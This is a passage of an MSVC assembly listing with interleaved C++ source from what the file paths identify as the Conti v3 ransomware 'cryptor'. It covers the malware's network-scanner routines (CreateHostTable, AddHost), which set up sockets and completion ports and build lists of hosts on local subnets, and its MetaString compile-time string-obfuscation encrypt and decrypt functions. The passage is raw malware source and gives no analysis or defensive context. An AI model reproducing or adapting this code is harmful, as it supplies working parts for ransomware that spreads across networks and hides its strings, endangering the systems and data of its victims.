	00 00 00	 mov	 DWORD PTR [rsp+32], 0
  000fb	45 33 c9	 xor	 r9d, r9d
  000fe	41 b8 06 00 00
	00		 mov	 r8d, 6
  00104	ba 01 00 00 00	 mov	 edx, 1
  00109	b9 02 00 00 00	 mov	 ecx, 2
  0010e	e8 00 00 00 00	 call	 ?pWSASocketW@@YA_KHHHPEAU_WSAPROTOCOL_INFOW@@IK@Z ; pWSASocketW
  00113	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$7[rbp]
  0011a	48 89 41 20	 mov	 QWORD PTR [rcx+32], rax

; 401  : 		if (ConnectCtx->s == INVALID_SOCKET) {

  0011e	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  00125	48 83 78 20 ff	 cmp	 QWORD PTR [rax+32], -1
  0012a	75 11		 jne	 SHORT $LN13@CreateHost

; 402  : 
; 403  : 			pGlobalFree(ConnectCtx);

  0012c	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$7[rbp]
  00133	e8 00 00 00 00	 call	 ?pGlobalFree@@YAPEAXPEAX@Z ; pGlobalFree

; 404  : 			continue;

  00138	e9 35 ff ff ff	 jmp	 $LN2@CreateHost
$LN13@CreateHost:

; 405  : 
; 406  : 		}
; 407  : 
; 408  : 		SOCKADDR_IN SockAddr;
; 409  : 		RtlSecureZeroMemory(&SockAddr, sizeof(SockAddr));

  0013d	ba 10 00 00 00	 mov	 edx, 16
  00142	48 8d 8d a8 00
	00 00		 lea	 rcx, QWORD PTR SockAddr$8[rbp]
  00149	e8 00 00 00 00	 call	 RtlSecureZeroMemory

; 410  : 		SockAddr.sin_family = AF_INET;

  0014e	b8 02 00 00 00	 mov	 eax, 2
  00153	66 89 85 a8 00
	00 00		 mov	 WORD PTR SockAddr$8[rbp], ax

; 411  : 		SockAddr.sin_port = 0;

  0015a	33 c0		 xor	 eax, eax
  0015c	66 89 85 aa 00
	00 00		 mov	 WORD PTR SockAddr$8[rbp+2], ax

; 412  : 		SockAddr.sin_addr.s_addr = INADDR_ANY;

  00163	c7 85 ac 00 00
	00 00 00 00 00	 mov	 DWORD PTR SockAddr$8[rbp+4], 0

; 413  : 
; 414  : 		if (pbind(ConnectCtx->s, (CONST SOCKADDR*) & SockAddr, sizeof(SockAddr)) != ERROR_SUCCESS) {

  0016d	41 b8 10 00 00
	00		 mov	 r8d, 16
  00173	48 8d 95 a8 00
	00 00		 lea	 rdx, QWORD PTR SockAddr$8[rbp]
  0017a	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  00181	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  00185	e8 00 00 00 00	 call	 ?pbind@@YAH_KPEBUsockaddr@@H@Z ; pbind
  0018a	85 c0		 test	 eax, eax
  0018c	74 21		 je	 SHORT $LN14@CreateHost

; 415  : 
; 416  : 			pclosesocket(ConnectCtx->s);

  0018e	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  00195	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  00199	e8 00 00 00 00	 call	 ?pclosesocket@@YAH_K@Z	; pclosesocket

; 417  : 			pGlobalFree(ConnectCtx);

  0019e	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$7[rbp]
  001a5	e8 00 00 00 00	 call	 ?pGlobalFree@@YAPEAXPEAX@Z ; pGlobalFree

; 418  : 			continue;

  001aa	e9 c3 fe ff ff	 jmp	 $LN2@CreateHost
$LN14@CreateHost:

; 419  : 
; 420  : 		}
; 421  : 
; 422  : 		if (!pCreateIoCompletionPort((HANDLE)ConnectCtx->s, g_IocpHandle, CONNECT_COMPLETION_KEY, 0)) {

  001af	45 33 c9	 xor	 r9d, r9d
  001b2	41 b8 02 00 00
	00		 mov	 r8d, 2
  001b8	48 8b 15 00 00
	00 00		 mov	 rdx, QWORD PTR ?g_IocpHandle@@3PEAXEA ; g_IocpHandle
  001bf	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  001c6	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  001ca	e8 00 00 00 00	 call	 ?pCreateIoCompletionPort@@YAPEAXPEAX0_KK@Z ; pCreateIoCompletionPort
  001cf	48 85 c0	 test	 rax, rax
  001d2	75 21		 jne	 SHORT $LN15@CreateHost

; 423  : 
; 424  : 			pclosesocket(ConnectCtx->s);

  001d4	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  001db	48 8b 48 20	 mov	 rcx, QWORD PTR [rax+32]
  001df	e8 00 00 00 00	 call	 ?pclosesocket@@YAH_K@Z	; pclosesocket

; 425  : 			pGlobalFree(ConnectCtx);

  001e4	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$7[rbp]
  001eb	e8 00 00 00 00	 call	 ?pGlobalFree@@YAPEAXPEAX@Z ; pGlobalFree

; 426  : 			continue;

  001f0	e9 7d fe ff ff	 jmp	 $LN2@CreateHost
$LN15@CreateHost:
$LN7@CreateHost:

; 427  : 
; 428  : 		}
; 429  : 
; 430  : 		TAILQ_INSERT_TAIL(&g_ConnectionList, ConnectCtx, Entries);

  001f5	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  001fc	48 c7 40 30 00
	00 00 00	 mov	 QWORD PTR [rax+48], 0
  00204	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  0020b	48 8b 0d 08 00
	00 00		 mov	 rcx, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8
  00212	48 89 48 38	 mov	 QWORD PTR [rax+56], rcx
  00216	48 8b 05 08 00
	00 00		 mov	 rax, QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8
  0021d	48 8b 8d 88 00
	00 00		 mov	 rcx, QWORD PTR ConnectCtx$7[rbp]
  00224	48 89 08	 mov	 QWORD PTR [rax], rcx
  00227	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR ConnectCtx$7[rbp]
  0022e	48 83 c0 30	 add	 rax, 48			; 00000030H
  00232	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_ConnectionList@@3Uconnection_list_@@A+8, rax
  00239	33 c0		 xor	 eax, eax
  0023b	85 c0		 test	 eax, eax
  0023d	75 b6		 jne	 SHORT $LN7@CreateHost

; 431  : 
; 432  : 	}

  0023f	e9 2e fe ff ff	 jmp	 $LN2@CreateHost
$LN3@CreateHost:
$LN10@CreateHost:

; 433  : 
; 434  : 	TAILQ_REMOVE(&g_SubnetList, SubnetInfo, Entries);

  00244	48 8b 45 08	 mov	 rax, QWORD PTR SubnetInfo$[rbp]
  00248	48 83 78 08 00	 cmp	 QWORD PTR [rax+8], 0
  0024d	74 16		 je	 SHORT $LN16@CreateHost
  0024f	48 8b 45 08	 mov	 rax, QWORD PTR SubnetInfo$[rbp]
  00253	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00257	48 8b 4d 08	 mov	 rcx, QWORD PTR SubnetInfo$[rbp]
  0025b	48 8b 49 10	 mov	 rcx, QWORD PTR [rcx+16]
  0025f	48 89 48 10	 mov	 QWORD PTR [rax+16], rcx
  00263	eb 0f		 jmp	 SHORT $LN17@CreateHost
$LN16@CreateHost:
  00265	48 8b 45 08	 mov	 rax, QWORD PTR SubnetInfo$[rbp]
  00269	48 8b 40 10	 mov	 rax, QWORD PTR [rax+16]
  0026d	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_SubnetList@@3Usubnet_list_@@A+8, rax
$LN17@CreateHost:
  00274	48 8b 45 08	 mov	 rax, QWORD PTR SubnetInfo$[rbp]
  00278	48 8b 40 10	 mov	 rax, QWORD PTR [rax+16]
  0027c	48 8b 4d 08	 mov	 rcx, QWORD PTR SubnetInfo$[rbp]
  00280	48 8b 49 08	 mov	 rcx, QWORD PTR [rcx+8]
  00284	48 89 08	 mov	 QWORD PTR [rax], rcx
  00287	33 c0		 xor	 eax, eax
  00289	85 c0		 test	 eax, eax
  0028b	75 b7		 jne	 SHORT $LN10@CreateHost

; 435  : 	free(SubnetInfo);

  0028d	48 8b 4d 08	 mov	 rcx, QWORD PTR SubnetInfo$[rbp]
  00291	e8 00 00 00 00	 call	 free

; 436  : 	return TRUE;

  00296	b8 01 00 00 00	 mov	 eax, 1
$LN1@CreateHost:

; 437  : }

  0029b	48 8b f8	 mov	 rdi, rax
  0029e	48 8d 4d d0	 lea	 rcx, QWORD PTR [rbp-48]
  002a2	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?CreateHostTable@@YAHXZ$rtcFrameData
  002a9	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  002ae	48 8b c7	 mov	 rax, rdi
  002b1	48 8b 8d 88 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  002b8	48 33 cd	 xor	 rcx, rbp
  002bb	e8 00 00 00 00	 call	 __security_check_cookie
  002c0	48 8d a5 98 01
	00 00		 lea	 rsp, QWORD PTR [rbp+408]
  002c7	5f		 pop	 rdi
  002c8	5d		 pop	 rbp
  002c9	c3		 ret	 0
?CreateHostTable@@YAHXZ ENDP				; CreateHostTable
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?AddHost@@YAHK@Z
_TEXT	SEGMENT
i$4 = 4
dwCurrentAddr$5 = 36
HostInfo$ = 72
dwAddress$ = 100
temp$ = 136
__$ArrayPad$ = 360
dwAddres$ = 400
?AddHost@@YAHK@Z PROC					; AddHost, COMDAT

; 331  : {

$LN13:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec a8 01
	00 00		 sub	 rsp, 424		; 000001a8H
  0000d	48 8d 6c 24 30	 lea	 rbp, QWORD PTR [rsp+48]
  00012	48 8d 7c 24 30	 lea	 rdi, QWORD PTR [rsp+48]
  00017	b9 2e 00 00 00	 mov	 ecx, 46			; 0000002eH
  0001c	b8 cc cc cc cc	 mov	 eax, -858993460		; ccccccccH
  00021	f3 ab		 rep stosd
  00023	8b 8c 24 c8 01
	00 00		 mov	 ecx, DWORD PTR [rsp+456]
  0002a	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  00031	48 33 c5	 xor	 rax, rbp
  00034	48 89 85 68 01
	00 00		 mov	 QWORD PTR __$ArrayPad$[rbp], rax
  0003b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__AF241CAA_network_scanner@cpp
  00042	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 332  : 	if (g_HostEntry) {

  00047	48 83 3d 00 00
	00 00 00	 cmp	 QWORD PTR ?g_HostEntry@@3PEAUhostent@@EA, 0 ; g_HostEntry
  0004f	74 51		 je	 SHORT $LN7@AddHost

; 333  : 		INT i = 0;

  00051	c7 45 04 00 00
	00 00		 mov	 DWORD PTR i$4[rbp], 0
$LN2@AddHost:

; 334  : 		while (g_HostEntry->h_addr_list[i] != NULL) {

  00058	48 63 45 04	 movsxd	 rax, DWORD PTR i$4[rbp]
  0005c	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_HostEntry@@3PEAUhostent@@EA ; g_HostEntry
  00063	48 8b 49 18	 mov	 rcx, QWORD PTR [rcx+24]
  00067	48 83 3c c1 00	 cmp	 QWORD PTR [rcx+rax*8], 0
  0006c	74 34		 je	 SHORT $LN3@AddHost

; 335  : 			DWORD dwCurrentAddr = *(DWORD*)g_HostEntry->h_addr_list[i++];

  0006e	48 63 45 04	 movsxd	 rax, DWORD PTR i$4[rbp]
  00072	48 8b 0d 00 00
	00 00		 mov	 rcx, QWORD PTR ?g_HostEntry@@3PEAUhostent@@EA ; g_HostEntry
  00079	48 8b 49 18	 mov	 rcx, QWORD PTR [rcx+24]
  0007d	48 8b 04 c1	 mov	 rax, QWORD PTR [rcx+rax*8]
  00081	8b 00		 mov	 eax, DWORD PTR [rax]
  00083	89 45 24	 mov	 DWORD PTR dwCurrentAddr$5[rbp], eax
  00086	8b 45 04	 mov	 eax, DWORD PTR i$4[rbp]
  00089	ff c0		 inc	 eax
  0008b	89 45 04	 mov	 DWORD PTR i$4[rbp], eax

; 336  : 			if (dwCurrentAddr == dwAddres) {

  0008e	8b 85 90 01 00
	00		 mov	 eax, DWORD PTR dwAddres$[rbp]
  00094	39 45 24	 cmp	 DWORD PTR dwCurrentAddr$5[rbp], eax
  00097	75 07		 jne	 SHORT $LN8@AddHost

; 337  : 				return FALSE;

  00099	33 c0		 xor	 eax, eax
  0009b	e9 f3 00 00 00	 jmp	 $LN1@AddHost
$LN8@AddHost:

; 338  : 			}
; 339  : 		}

  000a0	eb b6		 jmp	 SHORT $LN2@AddHost
$LN3@AddHost:
$LN7@AddHost:

; 340  : 	}
; 341  : 
; 342  : 	PHOST_INFO HostInfo = (PHOST_INFO)m_malloc(sizeof(HOST_INFO));

  000a2	b9 40 00 00 00	 mov	 ecx, 64			; 00000040H
  000a7	e8 00 00 00 00	 call	 ?m_malloc@@YAPEAX_K@Z	; m_malloc
  000ac	48 89 45 48	 mov	 QWORD PTR HostInfo$[rbp], rax

; 343  : 	if (!HostInfo) {

  000b0	48 83 7d 48 00	 cmp	 QWORD PTR HostInfo$[rbp], 0
  000b5	75 07		 jne	 SHORT $LN9@AddHost

; 344  : 		return FALSE;

  000b7	33 c0		 xor	 eax, eax
  000b9	e9 d5 00 00 00	 jmp	 $LN1@AddHost
$LN9@AddHost:

; 345  : 	}
; 346  : 
; 347  : 	DWORD dwAddress = INET_ADDRSTRLEN;

  000be	c7 45 64 16 00
	00 00		 mov	 DWORD PTR dwAddress$[rbp], 22

; 348  : 	SOCKADDR_IN temp;
; 349  : 	temp.sin_addr.s_addr = dwAddres;

  000c5	8b 85 90 01 00
	00		 mov	 eax, DWORD PTR dwAddres$[rbp]
  000cb	89 85 8c 00 00
	00		 mov	 DWORD PTR temp$[rbp+4], eax

; 350  : 	temp.sin_port = 0;

  000d1	33 c0		 xor	 eax, eax
  000d3	66 89 85 8a 00
	00 00		 mov	 WORD PTR temp$[rbp+2], ax

; 351  : 	temp.sin_family = AF_INET;

  000da	b8 02 00 00 00	 mov	 eax, 2
  000df	66 89 85 88 00
	00 00		 mov	 WORD PTR temp$[rbp], ax

; 352  : 	HostInfo->dwAddres = dwAddres;

  000e6	48 8b 45 48	 mov	 rax, QWORD PTR HostInfo$[rbp]
  000ea	8b 8d 90 01 00
	00		 mov	 ecx, DWORD PTR dwAddres$[rbp]
  000f0	89 08		 mov	 DWORD PTR [rax], ecx

; 353  : 
; 354  : 	if (dwAddres != STOP_MARKER) {

  000f2	83 bd 90 01 00
	00 ff		 cmp	 DWORD PTR dwAddres$[rbp], -1 ; ffffffffH
  000f9	74 3d		 je	 SHORT $LN10@AddHost

; 355  : 
; 356  : 
; 357  : 		if (SOCKET_ERROR == pWSAAddressToStringW((LPSOCKADDR)&temp, sizeof(temp), NULL, HostInfo->wszAddress, &dwAddres)) {

  000fb	48 8b 45 48	 mov	 rax, QWORD PTR HostInfo$[rbp]
  000ff	48 83 c0 04	 add	 rax, 4
  00103	48 8d 8d 90 01
	00 00		 lea	 rcx, QWORD PTR dwAddres$[rbp]
  0010a	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  0010f	4c 8b c8	 mov	 r9, rax
  00112	45 33 c0	 xor	 r8d, r8d
  00115	ba 10 00 00 00	 mov	 edx, 16
  0011a	48 8d 8d 88 00
	00 00		 lea	 rcx, QWORD PTR temp$[rbp]
  00121	e8 00 00 00 00	 call	 ?pWSAAddressToStringW@@YAHPEAUsockaddr@@KPEAU_WSAPROTOCOL_INFOW@@PEA_WPEAK@Z ; pWSAAddressToStringW
  00126	83 f8 ff	 cmp	 eax, -1
  00129	75 0d		 jne	 SHORT $LN11@AddHost

; 358  : 
; 359  : 			free(HostInfo);

  0012b	48 8b 4d 48	 mov	 rcx, QWORD PTR HostInfo$[rbp]
  0012f	e8 00 00 00 00	 call	 free

; 360  : 			return FALSE;

  00134	33 c0		 xor	 eax, eax
  00136	eb 5b		 jmp	 SHORT $LN1@AddHost
$LN11@AddHost:
$LN10@AddHost:

; 361  : 
; 362  : 		}
; 363  : 
; 364  : 	}
; 365  : 
; 366  : 	pEnterCriticalSection(&g_CriticalSection); {

  00138	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  0013f	e8 00 00 00 00	 call	 ?pEnterCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pEnterCriticalSection
$LN6@AddHost:

; 367  : 
; 368  : 		TAILQ_INSERT_TAIL(&g_HostList, HostInfo, Entries);

  00144	48 8b 45 48	 mov	 rax, QWORD PTR HostInfo$[rbp]
  00148	48 c7 40 30 00
	00 00 00	 mov	 QWORD PTR [rax+48], 0
  00150	48 8b 45 48	 mov	 rax, QWORD PTR HostInfo$[rbp]
  00154	48 8b 0d 08 00
	00 00		 mov	 rcx, QWORD PTR ?g_HostList@@3Uhost_list_@@A+8
  0015b	48 89 48 38	 mov	 QWORD PTR [rax+56], rcx
  0015f	48 8b 05 08 00
	00 00		 mov	 rax, QWORD PTR ?g_HostList@@3Uhost_list_@@A+8
  00166	48 8b 4d 48	 mov	 rcx, QWORD PTR HostInfo$[rbp]
  0016a	48 89 08	 mov	 QWORD PTR [rax], rcx
  0016d	48 8b 45 48	 mov	 rax, QWORD PTR HostInfo$[rbp]
  00171	48 83 c0 30	 add	 rax, 48			; 00000030H
  00175	48 89 05 08 00
	00 00		 mov	 QWORD PTR ?g_HostList@@3Uhost_list_@@A+8, rax
  0017c	33 c0		 xor	 eax, eax
  0017e	85 c0		 test	 eax, eax
  00180	75 c2		 jne	 SHORT $LN6@AddHost

; 369  : 
; 370  : 	}
; 371  : 	pLeaveCriticalSection(&g_CriticalSection);

  00182	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:?g_CriticalSection@@3U_RTL_CRITICAL_SECTION@@A ; g_CriticalSection
  00189	e8 00 00 00 00	 call	 ?pLeaveCriticalSection@@YAXPEAU_RTL_CRITICAL_SECTION@@@Z ; pLeaveCriticalSection

; 372  : 	return TRUE;

  0018e	b8 01 00 00 00	 mov	 eax, 1
$LN1@AddHost:

; 373  : }

  00193	48 8b f8	 mov	 rdi, rax
  00196	48 8d 4d d0	 lea	 rcx, QWORD PTR [rbp-48]
  0019a	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?AddHost@@YAHK@Z$rtcFrameData
  001a1	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  001a6	48 8b c7	 mov	 rax, rdi
  001a9	48 8b 8d 68 01
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  001b0	48 33 cd	 xor	 rcx, rbp
  001b3	e8 00 00 00 00	 call	 __security_check_cookie
  001b8	48 8d a5 78 01
	00 00		 lea	 rsp, QWORD PTR [rbp+376]
  001bf	5f		 pop	 rdi
  001c0	5d		 pop	 rbp
  001c1	c3		 ret	 0
?AddHost@@YAHK@Z ENDP					; AddHost
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 62	 sub	 eax, 98			; 00000062H
  0002d	6b c0 0a	 imul	 eax, eax, 10
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z PROC ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 59	 imul	 eax, eax, 89		; 00000059H
  0002d	83 c0 62	 add	 eax, 98			; 00000062H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0FJ@$0GC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<89,98,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
